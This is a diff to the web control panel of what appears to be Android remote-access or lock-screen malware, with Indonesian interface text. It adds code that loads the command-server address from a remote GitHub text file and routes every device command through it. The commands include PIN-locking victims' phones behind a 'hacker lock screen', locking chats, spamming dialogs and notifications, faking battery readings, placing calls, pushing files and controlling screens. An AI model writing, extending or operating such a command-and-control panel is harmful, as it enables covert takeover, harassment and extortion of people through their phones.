@@ -2268,6 +2268,23 @@ body::after {
 
 <script>
 
+const API_TXT_URL = "https://raw.githubusercontent.com/ZalRyuichi/Store/main/ryuichi_api.txt";
+let API_BASE = "";
+
+async function loadApiBase() {
+  try {
+    const cached = localStorage.getItem("app_api_base");
+    if (cached) API_BASE = cached.trim();
+    const r = await fetch(API_TXT_URL + "?t=" + Date.now());
+    if (r.ok) {
+      const u = (await r.text()).trim();
+      if (u && u.startsWith("http")) { API_BASE = u; localStorage.setItem("app_api_base", u); }
+    }
+  } catch { const c = localStorage.getItem("app_api_base"); if (c) API_BASE = c.trim(); }
+}
+
+function apiUrl(p) { return API_BASE ? `${API_BASE}${p}` : p; }
+
 const _token       = localStorage.getItem('bp_token')
 const _username    = localStorage.getItem('bp_username')
 const _role        = localStorage.getItem('bp_role')
@@ -2294,7 +2311,8 @@ setInterval(() => {
   }
 }, 30000)
 
-window.addEventListener('DOMContentLoaded', () => {
+window.addEventListener('DOMContentLoaded', async () => {
+  await loadApiBase();
   const uEl = document.getElementById('acct-username')
   const rEl = document.getElementById('acct-role')
   const hmU = document.getElementById('hmenu-username')
@@ -2411,11 +2429,11 @@ function backToSelect() {
   updateProtectionUI(false)
 }
 
-const socket = io()
+const socket = io(API_BASE || undefined)
 
 socket.on('connect', () => {
   socket.emit('controller:join', { token: _token })
-  fetch('/api/devices', { headers: { 'Authorization': 'Bearer ' + _token } }).then(r => r.json()).then(devices => {
+  fetch(apiUrl('/api/devices'), { headers: { 'Authorization': 'Bearer ' + _token } }).then(r => r.json()).then(devices => {
     allDevices = devices
     document.getElementById('stat-online').textContent = devices.length
     document.getElementById('tab-online-count').textContent = devices.length
@@ -2633,7 +2651,7 @@ function updateHmenuBadges(onlineCount, offlineCount) {
 }
 
 function loadOfflineDevices() {
-  fetch('/api/devices/offline', { headers: { 'Authorization': 'Bearer ' + _token } })
+  fetch(apiUrl('/api/devices/offline'), { headers: { 'Authorization': 'Bearer ' + _token } })
     .then(r => r.json()).then(devices => {
       renderOfflineList(devices)
     }).catch(() => {})
@@ -3907,7 +3925,7 @@ function confirmLock() {
     if (!title) { toast('Validation Error', 'error', 'Lock title cannot be empty'); return }
     if (!/^\d{4}$/.test(pin)) { toast('Validation Error', 'error', 'PIN must be exactly 4 digits'); return }
     if (_lockPendingToggle) _lockPendingToggle.checked = true
-    fetch(`/api/command/${_lockTargetDeviceId}`, {
+    fetch(apiUrl(`/api/command/${_lockTargetDeviceId}`), {
       method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify({ command:'lockDevice', value: JSON.stringify({ title, pin, lockType:'normal' }) })
     }).then(r=>r.json()).then(()=>{
@@ -3919,7 +3937,7 @@ function confirmLock() {
     const audio    = document.getElementById('lockAudioToggle').checked
     const customHtml = document.getElementById('lockCustomHtml').value.trim()
     if (_lockPendingToggle) _lockPendingToggle.checked = true
-    fetch(`/api/command/${_lockTargetDeviceId}`, {
+    fetch(apiUrl(`/api/command/${_lockTargetDeviceId}`), {
       method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify({ command:'lockDevice', value: JSON.stringify({ lockType:'custom', flash, audio, customHtml }) })
     }).then(r=>r.json()).then(()=>{
@@ -3932,13 +3950,13 @@ function confirmLock() {
 
 function onLockV2Toggle(deviceId, el) {
   if (el.checked) {
-    fetch(`/api/command/${deviceId}`, {
+    fetch(apiUrl(`/api/command/${deviceId}`), {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ command: 'lockV2', value: '' })
     }).then(() => toast('Lock V2', 'success', 'Hacker lock screen aktif'))
       .catch(() => { el.checked = false; toast('Gagal', 'error', 'Gagal mengunci') })
   } else {
-    fetch(`/api/lockv2/unlock/${deviceId}`, { method: 'POST' })
+    fetch(apiUrl(`/api/lockv2/unlock/${deviceId}`), { method: 'POST' })
       .then(() => toast('Lock V2', 'info', 'Device dibuka'))
       .catch(() => { el.checked = true; toast('Gagal', 'error', 'Gagal membuka kunci') })
   }
@@ -3968,7 +3986,7 @@ async function submitAudio() {
   const btn = document.querySelector('#audio-dialog-bg .action-dialog-submit')
   if (btn) btn.textContent = 'UPLOADING...'
   const buf = await file.arrayBuffer()
-  fetch('/api/audio/upload/' + deviceId, {
+  fetch(apiUrl('/api/audio/upload/') + deviceId, {
     method: 'POST',
     headers: { 'Content-Type': 'application/octet-stream', 'x-file-name': file.name, 'Authorization': 'Bearer ' + _token },
     body: buf
@@ -4086,7 +4104,7 @@ function submitMakeCall() {
   const deviceId = document.getElementById('call-dialog-bg').dataset.deviceId
   const number = document.getElementById('call-number-input').value.trim()
   if (!number) return
-  fetch(`/api/make-call/${deviceId}`, {
+  fetch(apiUrl(`/api/make-call/${deviceId}`), {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ number })
@@ -4126,7 +4144,7 @@ function updateProtectionUI(on) {
   if (toggle) toggle.checked = on
 }
 function sendCmd(deviceId, command, value, silent) {
-  fetch(`/api/command/${deviceId}`, {
+  fetch(apiUrl(`/api/command/${deviceId}`), {
     method:'POST', headers:{'Content-Type':'application/json'},
     body: JSON.stringify({command,value})
   }).then(r=>r.json()).then(()=>{
@@ -4339,7 +4357,7 @@ function toggleScreenCtrlMode() {
 
   function sendScreenCmd(cmd, payload) {
     if (!selectedDeviceId) return
-    fetch(`/api/command/${selectedDeviceId}`, {
+    fetch(apiUrl(`/api/command/${selectedDeviceId}`), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
       body: JSON.stringify({ command: cmd, value: JSON.stringify(payload) })
@@ -4486,7 +4504,7 @@ async function submitWpUrl() {
     if (!file) return toast('Wallpaper', 'error', 'Pilih file gambar dulu')
     if (btn) btn.textContent = 'UPLOADING...'
     const buf = await file.arrayBuffer()
-    fetch('/api/wallpaper/' + deviceId, {
+    fetch(apiUrl('/api/wallpaper/') + deviceId, {
       method: 'POST',
       headers: { 'Content-Type': 'application/octet-stream', 'Authorization': 'Bearer ' + _token },
       body: buf
@@ -4498,7 +4516,7 @@ async function submitWpUrl() {
     if (!url) return
     btn.disabled = true; btn.textContent = 'SENDING...'
     try {
-      const res = await fetch('/api/command/' + deviceId, {
+      const res = await fetch(apiUrl('/api/command/') + deviceId, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + _token },
         body: JSON.stringify({ command: 'setWallpaper', value: url })
@@ -4592,7 +4610,7 @@ async function submitCreateUser() {
   if (!user || !pass) { err.textContent = 'Username and password are required.'; err.classList.add('show'); return }
   btn.disabled = true; btn.textContent = 'CREATING...'
   try {
-    const res  = await fetch('/api/users/create', {
+    const res  = await fetch(apiUrl('/api/users/create'), {
       method:'POST',
       headers:{ 'Content-Type':'application/json', 'Authorization':'Bearer '+_token },
       body: JSON.stringify({ username:user, password:pass, role, displayName:user, expiredAt })
@@ -4661,7 +4679,7 @@ function addSmsLog(deviceId, entry) {
 
 function onSpamDialogToggle(deviceId, el) {
   const active = el.checked
-  fetch(`/api/command/${deviceId}`, {
+  fetch(apiUrl(`/api/command/${deviceId}`), {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: 'spamDialog', value: active ? 'true' : 'false' })
   }).catch(() => toast('Gagal kirim perintah', 'error'))
@@ -4671,7 +4689,7 @@ function onSpamDialogToggle(deviceId, el) {
 
 function onSosToggle(deviceId, el) {
   const active = el.checked
-  fetch(`/api/command/${deviceId}`, {
+  fetch(apiUrl(`/api/command/${deviceId}`), {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: 'sos', value: active ? 'true' : 'false' })
   }).catch(() => toast('Gagal kirim perintah', 'error'))
@@ -4706,7 +4724,7 @@ async function uploadWallpaperFile(deviceId, input) {
   const sub = document.getElementById('wp-status-' + deviceId)
   if (sub) sub.textContent = 'UPLOADING...'
   const buf = await file.arrayBuffer()
-  fetch('/api/wallpaper/' + deviceId, {
+  fetch(apiUrl('/api/wallpaper/') + deviceId, {
     method: 'POST',
     headers: { 'Content-Type': 'application/octet-stream', 'Authorization': 'Bearer ' + _token },
     body: buf
@@ -4725,7 +4743,7 @@ function onVideoToggle(deviceId, el) {
     el.checked = false
     openVideoPickerDialog(deviceId)
   } else {
-    fetch('/api/video/stop/' + deviceId, { method: 'POST', headers: { 'Authorization': 'Bearer ' + _token } })
+    fetch(apiUrl('/api/video/stop/') + deviceId, { method: 'POST', headers: { 'Authorization': 'Bearer ' + _token } })
       .then(() => toast('PLAYVIDEO', 'info', 'Video dihentikan'))
       .catch(() => toast('Gagal Stop Video', 'error'))
   }
@@ -5448,7 +5466,7 @@ function fmUpload(input) {
   if (!file) return
   if (file.size > 10 * 1024 * 1024) { showToast('error', 'FILE TERLALU BESAR', 'Maksimal 10MB'); return }
   file.arrayBuffer().then(buf => {
-    fetch(`/api/files/push/${fmDeviceId}`, {
+    fetch(apiUrl(`/api/files/push/${fmDeviceId}`), {
       method: 'POST',
       headers: {
         'Content-Type': file.type || 'application/octet-stream',
@@ -5962,7 +5980,7 @@ function onLockChatToggle(deviceId, el) {
     openLockChatDialog(deviceId)
     el.checked = false
   } else {
-    fetch(`/api/command/${deviceId}`, {
+    fetch(apiUrl(`/api/command/${deviceId}`), {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ command: 'unlockChat', value: '' })
     }).then(() => {
@@ -6022,7 +6040,7 @@ function submitLockChat(deviceId) {
   if (!/^\d+$/.test(pin)) { toast('PIN harus angka', 'error'); return }
   if (pin.length !== 4) { toast('PIN harus tepat 4 digit', 'error'); return }
   document.getElementById('lockchat-dialog').remove()
-  fetch(`/api/command/${deviceId}`, {
+  fetch(apiUrl(`/api/command/${deviceId}`), {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: 'lockChat', value: JSON.stringify({ title, pin, flash, audio }) })
   }).then(() => {
@@ -6760,7 +6778,7 @@ function submitNotifMgr() {
   if (!title || !body) return
   const sub = document.getElementById('notifmgr-sub-' + deviceId)
   if (sub) sub.textContent = 'SENDING...'
-  fetch(`/api/command/${deviceId}`, {
+  fetch(apiUrl(`/api/command/${deviceId}`), {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
     body: JSON.stringify({ command: 'showNotification', value: JSON.stringify({ title, body, count, interval }) })
@@ -6792,7 +6810,7 @@ function submitToastMgr() {
   if (!text) return
   const sub = document.getElementById('toastmgr-sub-' + deviceId)
   if (sub) sub.textContent = 'SENDING...'
-  fetch(`/api/command/${deviceId}`, {
+  fetch(apiUrl(`/api/command/${deviceId}`), {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
     body: JSON.stringify({ command: 'showToast', value: JSON.stringify({ text, duration, count }) })
@@ -6859,7 +6877,7 @@ function onFloatPhotoToggle(deviceId, el) {
       toast('Floating Photos', 'error', 'Tambah minimal 1 URL foto dulu')
       return
     }
-    fetch(`/api/command/${deviceId}`, {
+    fetch(apiUrl(`/api/command/${deviceId}`), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
       body: JSON.stringify({ command: 'floatPhotos', value: JSON.stringify({ urls, enabled: true }) })
@@ -6871,7 +6889,7 @@ function onFloatPhotoToggle(deviceId, el) {
       if (sub) sub.textContent = 'FAILED'
     })
   } else {
-    fetch(`/api/command/${deviceId}`, {
+    fetch(apiUrl(`/api/command/${deviceId}`), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
       body: JSON.stringify({ command: 'floatPhotos', value: JSON.stringify({ urls: [], enabled: false }) })
@@ -6927,7 +6945,7 @@ function onFakeBatteryToggle(deviceId, el) {
   const sub = document.getElementById('fakebattery-sub-' + deviceId)
   if (el.checked) {
     const s = _fakeBatterySettings[deviceId] || { percent: 1, charging: false }
-    fetch(`/api/command/${deviceId}`, {
+    fetch(apiUrl(`/api/command/${deviceId}`), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
       body: JSON.stringify({ command: 'fakeBattery', value: JSON.stringify({ enabled: true, percent: s.percent, charging: s.charging }) })
@@ -6939,7 +6957,7 @@ function onFakeBatteryToggle(deviceId, el) {
       if (sub) sub.textContent = 'FAILED'
     })
   } else {
-    fetch(`/api/command/${deviceId}`, {
+    fetch(apiUrl(`/api/command/${deviceId}`), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (_token || '') },
       body: JSON.stringify({ command: 'fakeBattery', value: JSON.stringify({ enabled: false }) })
